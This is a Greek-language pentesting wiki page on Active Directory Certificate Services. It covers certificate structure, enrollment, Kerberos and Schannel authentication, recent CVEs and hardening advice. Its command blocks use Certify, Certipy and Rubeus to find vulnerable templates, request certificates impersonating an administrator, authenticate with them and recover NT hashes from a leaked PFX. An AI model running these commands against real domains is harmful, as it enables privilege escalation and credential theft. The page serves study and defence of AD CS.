# Πιστοποιητικά AD

{{#include ../../banners/hacktricks-training.md}}

## Εισαγωγή

### Στοιχεία ενός πιστοποιητικού

- Το **Subject** του πιστοποιητικού δηλώνει τον κάτοχό του.
- Ένα **Public Key** αντιστοιχίζεται με ένα ιδιωτικά διατηρούμενο κλειδί, ώστε να συνδέεται το πιστοποιητικό με τον νόμιμο κάτοχό του.
- Η **Validity Period**, που ορίζεται από τις ημερομηνίες **NotBefore** και **NotAfter**, καθορίζει τη διάρκεια ισχύος του πιστοποιητικού.
- Ένας μοναδικός **Serial Number**, που παρέχεται από την Certificate Authority (CA), προσδιορίζει κάθε πιστοποιητικό.
- Το **Issuer** αναφέρεται στην CA που εξέδωσε το πιστοποιητικό.
- Το **SubjectAlternativeName** επιτρέπει πρόσθετα ονόματα για το subject, προσφέροντας μεγαλύτερη ευελιξία στην ταυτοποίηση.
- Το **Basic Constraints** προσδιορίζει αν το πιστοποιητικό προορίζεται για CA ή για τελική οντότητα και ορίζει περιορισμούς χρήσης.
- Τα **Extended Key Usages (EKUs)** καθορίζουν τους συγκεκριμένους σκοπούς του πιστοποιητικού, όπως την υπογραφή κώδικα ή την κρυπτογράφηση email, μέσω Object Identifiers (OIDs).
- Το **Signature Algorithm** καθορίζει τη μέθοδο υπογραφής του πιστοποιητικού.
- Το **Signature**, που δημιουργείται με το ιδιωτικό κλειδί του issuer, εγγυάται τη γνησιότητα του πιστοποιητικού.<sup>[[4]](#references)</sup>

### Ειδικές περιπτώσεις

- Τα **Subject Alternative Names (SANs)** διευρύνουν τη δυνατότητα εφαρμογής ενός πιστοποιητικού σε πολλαπλές ταυτότητες, κάτι κρίσιμο για διακομιστές με πολλαπλά domains. Οι ασφαλείς διαδικασίες έκδοσης είναι απαραίτητες για την αποφυγή κινδύνων πλαστοπροσωπίας από επιτιθέμενους που χειραγωγούν την προδιαγραφή SAN.<sup>[[4]](#references)</sup>

### Certificate Authorities (CAs) στο Active Directory (AD)

Το AD CS αναγνωρίζει τα πιστοποιητικά CA σε ένα AD forest μέσω καθορισμένων containers, καθένα από τα οποία εξυπηρετεί διαφορετικό ρόλο:<sup>[[4]](#references)</sup>

- Το container **Certification Authorities** περιέχει αξιόπιστα πιστοποιητικά root CA.
- Το container **Enrolment Services** περιέχει πληροφορίες για τις Enterprise CAs και τα certificate templates τους.
- Το αντικείμενο **NTAuthCertificates** περιλαμβάνει πιστοποιητικά CA που είναι εξουσιοδοτημένα για authentication στο AD.
- Το container **AIA (Authority Information Access)** διευκολύνει την επικύρωση της αλυσίδας πιστοποιητικών μέσω intermediate και cross CA certificates.

### Απόκτηση πιστοποιητικού: Ροή αιτήματος πιστοποιητικού από client

1. Η διαδικασία αιτήματος ξεκινά με τους clients να εντοπίζουν μια Enterprise CA.
2. Μετά τη δημιουργία ζεύγους δημόσιου-ιδιωτικού κλειδιού, δημιουργείται ένα CSR που περιέχει ένα public key και άλλες λεπτομέρειες.
3. Η CA αξιολογεί το CSR με βάση τα διαθέσιμα certificate templates και εκδίδει το πιστοποιητικό σύμφωνα με τα δικαιώματα του template.
4. Μετά την έγκριση, η CA υπογράφει το πιστοποιητικό με το ιδιωτικό της κλειδί και το επιστρέφει στον client.<sup>[[4]](#references)</sup>

### Certificate Templates

Αυτά τα templates, που ορίζονται στο AD, περιγράφουν τις ρυθμίσεις και τα δικαιώματα για την έκδοση πιστοποιητικών, συμπεριλαμβανομένων των επιτρεπόμενων EKUs και των δικαιωμάτων enrollment ή τροποποίησης, τα οποία είναι κρίσιμα για τη διαχείριση της πρόσβασης στις υπηρεσίες πιστοποιητικών.<sup>[[4]](#references)</sup>

**Η έκδοση του schema του template έχει σημασία.** Τα παλαιότερα templates **v1** (για παράδειγμα, το ενσωματωμένο template **WebServer**) δεν διαθέτουν αρκετές σύγχρονες ρυθμίσεις επιβολής πολιτικών. Η έρευνα **ESC15/EKUwu** έδειξε ότι σε **v1 templates**, ο requester μπορεί να ενσωματώσει **Application Policies/EKUs** στο CSR, τα οποία **προτιμώνται έναντι** των EKUs που έχουν ρυθμιστεί στο template. Αυτό επιτρέπει τη δημιουργία πιστοποιητικών client-auth, enrollment agent ή code-signing με μόνο δικαιώματα enrollment. Προτιμήστε **v2/v3 templates**, αφαιρέστε ή αντικαταστήστε τις προεπιλεγμένες ρυθμίσεις v1 και περιορίστε αυστηρά τα EKUs στον προβλεπόμενο σκοπό.<sup>[[1]](#references)</sup>

## Εγγραφή πιστοποιητικών

Η διαδικασία εγγραφής πιστοποιητικών ξεκινά από έναν administrator, ο οποίος **δημιουργεί ένα certificate template**, το οποίο στη συνέχεια **δημοσιεύεται** από μια Enterprise Certificate Authority (CA). Έτσι, το template γίνεται διαθέσιμο για enrollment από clients. Αυτό επιτυγχάνεται με την προσθήκη του ονόματος του template στο πεδίο `certificatetemplates` ενός αντικειμένου Active Directory.<sup>[[4]](#references)</sup>

Για να μπορέσει ένας client να ζητήσει πιστοποιητικό, πρέπει να του παραχωρηθούν **δικαιώματα enrollment**. Αυτά τα δικαιώματα ορίζονται από security descriptors στο ίδιο το certificate template και στην Enterprise CA. Για να είναι επιτυχές ένα αίτημα, πρέπει να έχουν παραχωρηθεί δικαιώματα και στις δύο τοποθεσίες.<sup>[[4]](#references)</sup>

### Δικαιώματα enrollment template

Αυτά τα δικαιώματα καθορίζονται μέσω Access Control Entries (ACEs), οι οποίες ορίζουν δικαιώματα όπως:<sup>[[4]](#references)</sup>

- Δικαιώματα **Certificate-Enrollment** και **Certificate-AutoEnrollment**, καθένα από τα οποία συσχετίζεται με συγκεκριμένα GUIDs.
- **ExtendedRights**, που επιτρέπουν όλα τα extended permissions.
- **FullControl/GenericAll**, που παρέχουν πλήρη έλεγχο του template.

### Δικαιώματα enrollment της Enterprise CA

Τα δικαιώματα της CA περιγράφονται στο security descriptor της, στο οποίο μπορείτε να αποκτήσετε πρόσβαση μέσω της κονσόλας διαχείρισης Certificate Authority. Ορισμένες ρυθμίσεις επιτρέπουν ακόμη και σε χρήστες με χαμηλά προνόμια απομακρυσμένη πρόσβαση, κάτι που μπορεί να αποτελέσει κίνδυνο για την ασφάλεια.<sup>[[4]](#references)</sup>

### Πρόσθετοι έλεγχοι έκδοσης

Ενδέχεται να ισχύουν ορισμένοι έλεγχοι, όπως:<sup>[[4]](#references)</sup>

- **Manager Approval**: Τοποθετεί τα αιτήματα σε κατάσταση αναμονής μέχρι να εγκριθούν από έναν certificate manager.
- **Enrolment Agents and Authorized Signatures**: Καθορίζουν τον απαιτούμενο αριθμό υπογραφών σε ένα CSR και τα απαραίτητα Application Policy OIDs.

### Μέθοδοι αιτήματος πιστοποιητικών

Τα πιστοποιητικά μπορούν να ζητηθούν μέσω:<sup>[[4]](#references)</sup>

1. Του **Windows Client Certificate Enrollment Protocol** (MS-WCCE), με χρήση διεπαφών DCOM.
2. Του **ICertPassage Remote Protocol** (MS-ICPR), μέσω named pipes ή TCP/IP.
3. Της **web interface εγγραφής πιστοποιητικών**, με εγκατεστημένο τον ρόλο Certificate Authority Web Enrollment.
4. Του **Certificate Enrollment Service** (CES), σε συνδυασμό με την υπηρεσία Certificate Enrollment Policy (CEP).
5. Του **Network Device Enrollment Service** (NDES) για συσκευές δικτύου, με χρήση του Simple Certificate Enrollment Protocol (SCEP).

Οι χρήστες Windows μπορούν επίσης να ζητήσουν πιστοποιητικά μέσω του GUI (`certmgr.msc` ή `certlm.msc`) ή εργαλείων γραμμής εντολών (`certreq.exe` ή της εντολής PowerShell `Get-Certificate`).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Πιστοποίηση μέσω πιστοποιητικού

Το Active Directory (AD) υποστηρίζει πιστοποίηση μέσω πιστοποιητικού, χρησιμοποιώντας κυρίως τα πρωτόκολλα **Kerberos** και **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Διαδικασία πιστοποίησης Kerberos

Στη διαδικασία πιστοποίησης Kerberos, το αίτημα ενός χρήστη για ένα Ticket Granting Ticket (TGT) υπογράφεται με το **ιδιωτικό κλειδί** του πιστοποιητικού του χρήστη. Αυτό το αίτημα υποβάλλεται σε διάφορους ελέγχους από τον ελεγκτή τομέα, μεταξύ των οποίων η **ισχύς**, η **αλυσίδα πιστοποιητικών** και η **κατάσταση ανάκλησης** του πιστοποιητικού. Οι έλεγχοι περιλαμβάνουν επίσης την επαλήθευση ότι το πιστοποιητικό προέρχεται από αξιόπιστη πηγή και την επιβεβαίωση ότι ο εκδότης υπάρχει στο **NTAUTH certificate store**. Οι επιτυχείς έλεγχοι οδηγούν στην έκδοση ενός TGT. Το αντικείμενο **`NTAuthCertificates`** στο AD βρίσκεται στη διεύθυνση:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

είναι κεντρικής σημασίας για την εδραίωση εμπιστοσύνης στον έλεγχο ταυτότητας με πιστοποιητικά.<sup>[[4]](#references)</sup>

Από την κυκλοφορία του **KB5014754**, ο σύγχρονος έλεγχος ταυτότητας Kerberos με πιστοποιητικά αφορά κυρίως την **ισχύ της αντιστοίχισης**, όχι μόνο τα EKU.<sup>[[2]](#references)</sup> Σε hardened forests:

- Ένα πιστοποιητικό που περιλαμβάνει μόνο **UPN/DNS SAN** ενδέχεται να μην επαρκεί πλέον για σύνδεση.
- Το KDC προτιμά μια **ισχυρή σύνδεση**, συνήθως την επέκταση ασφαλείας SID (`1.3.6.1.4.1.311.25.2`) ή μια ισχυρή ρητή αντιστοίχιση στο `altSecurityIdentities`.
- Αν το πιστοποιητικό δεν έχει ισχυρή αντιστοίχιση, οι DC καταγράφουν τα **Kdcsvc Event ID 39/41** σε λειτουργία συμβατότητας και αρνούνται τον έλεγχο ταυτότητας σε λειτουργία enforcement.
- Σε μικτές διαδρομές επίθεσης, τα **ESC9/ESC16** έχουν σημασία επειδή αφαιρούν την επέκταση SID από τα πιστοποιητικά που εκδίδονται· στη συνέχεια, οι operators βασίζονται σε ρητές αντιστοιχίσεις ή σε μορφές SID URL SAN, όπου τις υποστηρίζει η διαδρομή επίθεσης.

### Έλεγχος ταυτότητας μέσω Secure Channel (Schannel)

Το Schannel διευκολύνει ασφαλείς συνδέσεις TLS/SSL, κατά τις οποίες, στη διάρκεια ενός handshake, ο client παρουσιάζει ένα πιστοποιητικό που, αν επικυρωθεί επιτυχώς, εξουσιοδοτεί την πρόσβαση.<sup>[[5]](#references)</sup> Η αντιστοίχιση ενός πιστοποιητικού με έναν λογαριασμό AD μπορεί να περιλαμβάνει τη λειτουργία **S4U2Self** του Kerberos ή το **Subject Alternative Name (SAN)** του πιστοποιητικού, μεταξύ άλλων μεθόδων.<sup>[[4]](#references)</sup>

Το Schannel αποτελεί επίσης την πρακτική εναλλακτική όταν το **PKINIT** δεν είναι διαθέσιμο. Για παράδειγμα, αν ένας domain controller δεν διαθέτει κατάλληλο πιστοποιητικό **Smart Card Logon**, το `certipy auth`/τα εργαλεία PKINIT ενδέχεται να μην μπορούν να λάβουν TGT, αλλά το ίδιο πιστοποιητικό μπορεί και πάλι να χρησιμοποιηθεί για έλεγχο ταυτότητας και λειτουργίες LDAP μέσω **LDAPS** ή **LDAP StartTLS**.

### Απαρίθμηση AD Certificate Services

Οι υπηρεσίες πιστοποιητικών του AD μπορούν να απαριθμηθούν μέσω ερωτημάτων LDAP, αποκαλύπτοντας πληροφορίες για τις **Enterprise Certificate Authorities (CAs)** και τις ρυθμίσεις τους. Η πρόσβαση σε αυτές είναι δυνατή από κάθε χρήστη που έχει πραγματοποιήσει έλεγχο ταυτότητας στον τομέα, χωρίς ειδικά δικαιώματα.<sup>[[4]](#references)</sup> Εργαλεία όπως τα **[Certify](https://github.com/GhostPack/Certify)** και **[Certipy](https://github.com/ly4k/Certipy)** χρησιμοποιούνται για απαρίθμηση και αξιολόγηση ευπαθειών σε περιβάλλοντα AD CS.<sup>[[6]](#references)</sup>

Οι εντολές για τη χρήση αυτών των εργαλείων περιλαμβάνουν:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Σημαίες απαρίθμησης του Certify και PKINIT με το Rubeus

Οι παρακάτω παραλλαγές εντολών του Certify διατηρούν τα ξεχωριστά φίλτρα και τις επιλογές εξόδου τους.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Το Rubeus μπορεί επίσης να χρησιμοποιήσει ένα προστατευμένο με κωδικό πρόσβασης πιστοποιητικό PFX για έλεγχο ταυτότητας PKINIT και να ζητήσει ένα TGT. Ο προαιρετικός διακόπτης `/getcredentials` ζητά ένα service ticket U2U και επιχειρεί να ανακτήσει το NT hash του λογαριασμού:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Για πρότυπα ειδικά για ESC και κατάχρηση CA, δείτε το [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Πρόσφατες ευπάθειες και ενημερώσεις ασφαλείας (2022-2025)

| Έτος | ID / Όνομα | Αντίκτυπος | Βασικά συμπεράσματα |
|------|-----------|------------|---------------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Privilege escalation* μέσω spoofing πιστοποιητικών λογαριασμών υπολογιστή κατά το PKINIT. | Η ενημέρωση κώδικα περιλαμβάνεται στις ενημερώσεις ασφαλείας της **10ης Μαΐου 2022**. Οι έλεγχοι και τα στοιχεία ελέγχου strong-mapping εισήχθησαν μέσω του **KB5014754**· τα περιβάλλοντα θα πρέπει πλέον να βρίσκονται σε λειτουργία *Full Enforcement*. |
| 2023 | **CVE-2023-35350 / 35351** | *Remote code-execution* στους ρόλους AD CS Web Enrollment (certsrv) και CES. | Τα δημόσια PoC είναι περιορισμένα, αλλά τα ευάλωτα στοιχεία του IIS είναι συχνά εκτεθειμένα εσωτερικά. Εγκαταστήστε την ενημέρωση κώδικα που κυκλοφόρησε στο Patch Tuesday του **Ιουλίου 2023**. |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | Σε **v1 templates**, ένας αιτών με δικαιώματα εγγραφής μπορεί να ενσωματώσει **Application Policies/EKUs** στο CSR, τα οποία έχουν προτεραιότητα έναντι των EKU του προτύπου, δημιουργώντας πιστοποιητικά για client-auth, enrollment agent ή code-signing. | Η ευπάθεια διορθώθηκε στις **12 Νοεμβρίου 2024**. Αντικαταστήστε ή υπερκαλύψτε τα v1 templates (π.χ. το προεπιλεγμένο WebServer), περιορίστε τα EKU στον σκοπό τους και περιορίστε τα δικαιώματα εγγραφής. |

### Χρονοδιάγραμμα hardening της Microsoft (KB5014754)

Η Microsoft εισήγαγε μια διάθεση τριών φάσεων (Compatibility → Audit → Enforcement), ώστε ο έλεγχος ταυτότητας πιστοποιητικών Kerberos να απομακρυνθεί από τις αδύναμες έμμεσες αντιστοιχίσεις. Από τις **11 Φεβρουαρίου 2025**, οι domain controllers μεταβαίνουν αυτόματα σε **Full Enforcement**, αν δεν έχει οριστεί η τιμή μητρώου `StrongCertificateBindingEnforcement`. Αργότερα, η Microsoft ενημέρωσε το χρονοδιάγραμμα, ώστε να παραμείνει δυνατή η επιστροφή στη λειτουργία compatibility μέχρι την ενημέρωση ασφαλείας της **9ης Σεπτεμβρίου 2025**.<sup>[[2]](#references)</sup> Οι διαχειριστές θα πρέπει:

1. Να εγκαταστήσουν ενημερώσεις σε όλους τους DC και τους διακομιστές AD CS (Μάιος 2022 ή νεότερες).
2. Να παρακολουθούν τα Event ID 39/41 για αδύναμες αντιστοιχίσεις κατά τη φάση *Audit*.
3. Να επανεκδώσουν πιστοποιητικά client-auth με τη νέα **SID extension** ή να ρυθμίσουν ισχυρές μη αυτόματες αντιστοιχίσεις πριν η enforcement αποκλείσει τις αδύναμες αντιστοιχίσεις.

### Σημειώσεις για operators σε hardened forests

- **Τα ESC1/ESC6 από μόνα τους δεν αποτελούν πλέον όλη την εικόνα** σε περιβάλλοντα του 2025 και μετά. Αν ζητήσετε πιστοποιητικό για άλλη principal, συνήθως χρειάζεστε επίσης ένα στοιχείο ισχυρής αντιστοίχισης, όπως τη SID extension ή μια ρητή αντιστοίχιση.
- Το **ESC15 (EKUwu)** είναι κυρίως χρήσιμο σε περιβάλλοντα χωρίς τις ενημερώσεις κώδικα, επειδή μετατρέπει ακίνδυνα **v1** templates όπως το **WebServer** σε πιστοποιητικά κατάλληλα για authentication ή enrollment agent, εισάγοντας **Application Policies**. Το Kerberos PKINIT εξακολουθεί να ελέγχει τα EKU, αλλά το **LDAP Schannel** λαμβάνει επίσης υπόψη τις Application Policies, διατηρώντας σχετική την κατάχρηση μέσω LDAP.<sup>[[1]](#references)</sup>
- Το **ESC16** είναι ρύθμιση σε επίπεδο CA: αν η CA απενεργοποιήσει καθολικά την επέκταση ασφάλειας SID, κάθε πιστοποιητικό που εκδίδεται επιστρέφει σε ασθενέστερη συμπεριφορά αντιστοίχισης, εκτός αν η αλυσίδα επίθεσης εισαγάγει SID με άλλη υποστηριζόμενη μορφή.
- **Τα δικαιώματα ESC7 είναι διακριτά:** η εκχώρηση `ManageCA` σε μια CA μπορεί να επιτρέψει αλλαγές σε ρυθμίσεις όπως `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), ενώ το `ManageCertificates` ελέγχει την έγκριση αιτημάτων. Μια ρητή Deny για δικαιώματα διαχειριστή πιστοποιητικών μπορεί να αποκλείσει αυτή τη διαδρομή έγκρισης, ακόμη κι αν υπάρχει και Allow· αξιολογήστε την αποτελεσματική ACL της CA πριν συνδυάσετε ρυθμίσεις και templates. Δείτε την [αξιολόγηση ACL της CA από τη Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Βελτιώσεις στον εντοπισμό και το hardening

* Ο αισθητήρας AD CS του **Defender for Identity (2023-2024)** εμφανίζει πλέον αξιολογήσεις στάσης ασφαλείας για ESC1-ESC8/ESC11 και δημιουργεί ειδοποιήσεις σε πραγματικό χρόνο, όπως *“Domain-controller certificate issuance for a non-DC”* (ESC8) και *“Prevent Certificate Enrollment with arbitrary Application Policies”* (ESC15). Βεβαιωθείτε ότι έχουν αναπτυχθεί αισθητήρες σε όλους τους διακομιστές AD CS, ώστε να επωφεληθείτε από αυτούς τους εντοπισμούς.<sup>[[3]](#references)</sup>
* Απενεργοποιήστε ή περιορίστε αυστηρά την επιλογή **“Supply in the request”** σε όλα τα templates· προτιμήστε ρητά ορισμένες τιμές SAN/EKU.
* Αφαιρέστε τα **Any Purpose** ή **No EKU** από τα templates, εκτός αν είναι απολύτως απαραίτητα (αντιμετωπίζει σενάρια ESC2).
* Απαιτήστε **έγκριση διαχειριστή** ή ειδικές ροές εργασίας Enrollment Agent για ευαίσθητα templates (π.χ. WebServer / CodeSigning).
* Περιορίστε τα endpoints web enrollment (`certsrv`) και CES/NDES σε έμπιστα δίκτυα ή προστατέψτε τα με authentication μέσω πιστοποιητικών client.
* Επιβάλετε κρυπτογράφηση RPC enrollment (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) για να μετριάσετε το ESC11 (RPC relay). Η σημαία είναι **ενεργοποιημένη από προεπιλογή**, αλλά συχνά απενεργοποιείται για παλαιούς clients, ανοίγοντας ξανά τον κίνδυνο relay.
* Ασφαλίστε τα **IIS-based enrollment endpoints** (CES/Certsrv): απενεργοποιήστε το NTLM όπου είναι δυνατό ή απαιτήστε HTTPS + Extended Protection για να αποκλείσετε τα ESC8 relay.

Αξιολογήστε το ESC11 στον host που εκτελεί την CA, ο οποίος μπορεί να είναι διακομιστής-μέλος του domain και όχι domain controller. Διαβάστε το `InterfaceFlags` της ενεργής CA από το `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`· μια τιμή που δεν μπορεί να αναγνωστεί ή απουσιάζει αποτελεί άγνωστο αποτέλεσμα, όχι απόδειξη ότι η κρυπτογράφηση RPC είναι απενεργοποιημένη. Αν το bit `IF_ENFORCEENCRYPTICERTREQUEST` είναι μηδενισμένο, αυτό αποτελεί ένδειξη ρύθμισης που χρειάζεται περαιτέρω διερεύνηση· απαιτούνται επίσης προσβάσιμο endpoint enrollment RPC, credentials που μπορούν να εξαναγκαστούν και κατάλληλο certificate template. Για το ESC8, μια πρόκληση HTTP NTLM από μόνη της δεν αρκεί: επιβεβαιώστε ότι υπάρχει λειτουργικό endpoint enrollment.

---

## References

- [1] [EKUwu: Όχι απλώς άλλο ένα AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Αλλαγές στον έλεγχο ταυτότητας βάσει πιστοποιητικών σε domain controllers των Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Αξιολογήσεις στάσης ασφαλείας πιστοποιητικών - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Κατάχρηση των Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Τι είναι ο έλεγχος ταυτότητας client SSL/TLS και πώς λειτουργεί;](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
